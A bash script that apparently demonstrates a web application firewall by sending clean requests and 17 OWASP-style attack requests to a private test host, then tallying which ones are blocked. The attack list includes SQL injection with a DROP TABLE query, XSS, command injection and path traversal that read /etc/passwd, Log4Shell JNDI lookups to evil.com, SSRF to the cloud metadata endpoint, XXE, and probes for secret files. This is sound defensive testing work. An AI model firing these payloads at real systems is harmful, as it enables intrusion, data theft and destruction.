#!/usr/bin/env bash
# ==============================================================================
#  Next-Gen ESDS WAF — Live OWASP Attack Demo
# ==============================================================================
#  Fires a sweep of OWASP Top 10 attacks at the WAF. Every one should be BLOCKED
#  (HTTP 403). Clean traffic is sent first to prove legitimate users pass (200).
#  The script is SELF-VERIFYING: it prints BLOCKED / ALLOWED per attack and a
#  final tally — so a pre-demo "dry run" is also your safety check.
#
#  All 20 payloads were verified returning 403 against this WAF on 2026-07-07.
#
#  USAGE
#    ./waf-demo.sh                 # paced mode: press Enter before each attack (narrate)
#    ./waf-demo.sh --fast          # fire everything back-to-back (no pauses)
#    ./waf-demo.sh --list          # just print what it would do, send nothing
#    TARGET=https://172.16.21.71 ./waf-demo.sh   # attack over HTTPS instead of HTTP
#
#  ENV OVERRIDES
#    TARGET    base URL of the WAF          (default http://172.16.21.71)
#    HOST_HDR  Host header the WAF matches  (default 172.16.21.71  -> "Juice Shop" site)
#
#  NOTE — behavioral correlation engine (a FEATURE, mention it):
#    After ~8 blocks in 60s from one source IP, the WAF fingerprints the
#    attacker and blocks everything from it as "ANOMALY" instead of the specific
#    rule. For crisp per-attack labels in the dashboard, run in PACED mode and
#    reset the engine right before the live demo (see DEMO-RUNBOOK.md).
# ==============================================================================
set -uo pipefail

TARGET="${TARGET:-http://172.16.21.71}"
HOST_HDR="${HOST_HDR:-172.16.21.71}"
MODE="paced"
[[ "${1:-}" == "--fast" ]] && MODE="fast"
[[ "${1:-}" == "--list" ]] && MODE="list"

# ---- colors -----------------------------------------------------------------
if [[ -t 1 ]]; then
  B=$'\e[1m'; DIM=$'\e[2m'; R=$'\e[0m'
  RED=$'\e[91m'; GRN=$'\e[92m'; YEL=$'\e[93m'; CYN=$'\e[96m'; MAG=$'\e[95m'
else
  B=''; DIM=''; R=''; RED=''; GRN=''; YEL=''; CYN=''; MAG=''
fi

CURL=(curl -s -k --max-time 10 -H "Host: ${HOST_HDR}")
PASS=0; BLOCKED=0; LEAKED=0; TOTAL=0

banner() {
  printf "\n${CYN}${B}"
  printf "  ███  NEXT-GEN ESDS WAF  ·  LIVE OWASP ATTACK DEMO  ███${R}\n"
  printf "  ${DIM}target: %s   host: %s   mode: %s${R}\n\n" "$TARGET" "$HOST_HDR" "$MODE"
}

pause() {
  [[ "$MODE" == "fast" ]] && { sleep 0.4; return; }
  [[ "$MODE" == "list" ]] && return
  printf "   ${DIM}[Enter] → fire next${R}"; read -r _ 2>/dev/null || true
  printf "\033[1A\033[2K"   # erase the prompt line
}

# clean NAME  curl-args...   (expects 200)
clean() {
  local name="$1"; shift
  [[ "$MODE" == "list" ]] && { printf "   ${GRN}clean${R}  %s\n" "$name"; return; }
  local code; code=$("${CURL[@]}" -o /dev/null -w '%{http_code}' "$@")
  if [[ "$code" == "200" ]]; then
    printf "   ${GRN}✓ ALLOWED  %s${R}  ${DIM}(HTTP %s — legitimate user passes)${R}\n" "$name" "$code"
  else
    printf "   ${YEL}? %s → HTTP %s${R}  ${DIM}(expected 200)${R}\n" "$name" "$code"
  fi
}

# attack NAME  OWASP  PAYLOAD  --  curl-args...   (expects 403)
attack() {
  local name="$1" owasp="$2" payload="$3"; shift 3
  [[ "$1" == "--" ]] && shift
  TOTAL=$((TOTAL+1))
  if [[ "$MODE" == "list" ]]; then
    printf "   ${RED}atk${R}  ${B}%-22s${R} ${DIM}%-24s %s${R}\n" "$name" "$owasp" "$payload"; return
  fi
  printf "${B}${MAG}▶ %s${R}  ${DIM}%s${R}\n" "$name" "$owasp"
  printf "   ${DIM}payload:${R} ${YEL}%s${R}\n" "$payload"
  local code; code=$("${CURL[@]}" -o /dev/null -w '%{http_code}' "$@")
  case "$code" in
    403) printf "   ${GRN}${B}🛡  BLOCKED${R}  ${GRN}(HTTP 403 — WAF rejected the request)${R}\n"; BLOCKED=$((BLOCKED+1));;
    000) printf "   ${YEL}⚠  NO RESPONSE (HTTP 000 — check network / Host header)${R}\n";;
    *)   printf "   ${RED}${B}✗  NOT BLOCKED (HTTP %s)${R}\n" "$code"; LEAKED=$((LEAKED+1));;
  esac
  printf "\n"; pause
}

banner

# ── PHASE 0 — clean traffic (run FIRST, before the attacker IP gets flagged) ──
printf "${B}── Legitimate traffic (should pass) ─────────────────────────${R}\n"
clean "Homepage"                 "$TARGET/"
clean "Product search (benign)"  -G "$TARGET/rest/products/search" --data-urlencode "q=apple"
clean "Static asset"             "$TARGET/main.js"
printf "\n${B}── OWASP Top 10 attacks (should all be blocked) ─────────────${R}\n\n"
[[ "$MODE" != "list" ]] && pause

# ── PHASE 1 — attacks (ordered headline-first for crisp per-attack labels) ──
attack "SQL Injection"     "A03:2021 Injection"        "?q=1' OR '1'='1"                  -- -G "$TARGET/rest/products/search" --data-urlencode "q=1' OR '1'='1"
attack "SQLi — UNION"      "A03:2021 Injection"        "id=1 UNION SELECT user,pass.."    -- -G "$TARGET/" --data-urlencode "id=1 UNION SELECT username,password FROM users"
attack "SQLi — stacked"    "A03:2021 Injection"        "id=1; DROP TABLE users--"         -- -G "$TARGET/" --data-urlencode "id=1; DROP TABLE users--"
attack "XSS — <script>"    "A03:2021 Injection"        "<script>alert(1)</script>"        -- -G "$TARGET/" --data-urlencode "q=<script>alert(1)</script>"
attack "XSS — img onerror" "A03:2021 Injection"        "<img src=x onerror=alert(1)>"     -- -G "$TARGET/" --data-urlencode "q=<img src=x onerror=alert(1)>"
attack "Path Traversal"    "A01:2021 Broken Access"    "../../../../etc/passwd"           -- -G "$TARGET/" --data-urlencode "file=../../../../etc/passwd"
attack "Command Injection" "A03:2021 Injection"        "127.0.0.1;cat /etc/passwd"        -- -G "$TARGET/" --data-urlencode "host=127.0.0.1;cat /etc/passwd"
attack "Log4Shell (param)" "A06:2021 Vuln Components"  "\${jndi:ldap://evil/a}"           -- -G "$TARGET/" --data-urlencode 'x=${jndi:ldap://evil.com/a}'
attack "Log4Shell (header)" "A06:2021 Vuln Components" "X-Api: \${jndi:ldap://evil/a}"    -- -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' "$TARGET/"
attack "RCE — PHP"         "A03:2021 Injection"        "code=system('id')"                -- -G "$TARGET/" --data-urlencode "code=system('id')"
attack "SSRF — metadata"   "A10:2021 SSRF"             "url=http://169.254.169.254/.."    -- -G "$TARGET/" --data-urlencode "url=http://169.254.169.254/latest/meta-data/"
attack "Local File Include" "A05:2021 Misconfig"       "page=/etc/passwd"                 -- -G "$TARGET/" --data-urlencode "page=/etc/passwd"
attack "XXE Injection"     "A05:2021 Misconfig"        "<!ENTITY xxe SYSTEM file:///..>"  -- -H 'Content-Type: application/xml' --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>' "$TARGET/rest/products"
attack "Recon — sqlmap"    "Threat-Intel (bad UA)"     "User-Agent: sqlmap/1.5"           -- -A 'sqlmap/1.5.2#stable' "$TARGET/"
attack "Recon — Nikto"     "Threat-Intel (bad UA)"     "User-Agent: Nikto/2.1.6"          -- -A 'Nikto/2.1.6' "$TARGET/"
attack "Secret file — .env" "A05:2021 Misconfig"       "GET /.env"                        -- "$TARGET/.env"
attack "Secret file — .git" "A05:2021 Misconfig"       "GET /.git/config"                 -- "$TARGET/.git/config"

# ── Summary ──────────────────────────────────────────────────────────────────
if [[ "$MODE" != "list" ]]; then
  printf "${B}── Result ───────────────────────────────────────────────────${R}\n"
  if [[ $LEAKED -eq 0 ]]; then
    printf "   ${GRN}${B}🛡  %d / %d attacks BLOCKED by Next-Gen ESDS WAF${R}\n" "$BLOCKED" "$TOTAL"
    printf "   ${DIM}Every OWASP payload was rejected. Clean traffic passed.${R}\n"
  else
    printf "   ${YEL}${B}%d / %d blocked · %d GOT THROUGH${R}  ${DIM}(re-run after a reset — see runbook)${R}\n" "$BLOCKED" "$TOTAL" "$LEAKED"
  fi
  printf "   ${DIM}→ Watch these on the dashboard: Overview 'Threats Blocked', Logs (live),${R}\n"
  printf "   ${DIM}  Threat Search (/events), and Threat Intel → Recent Intel Blocks (sqlmap/Nikto).${R}\n\n"
fi
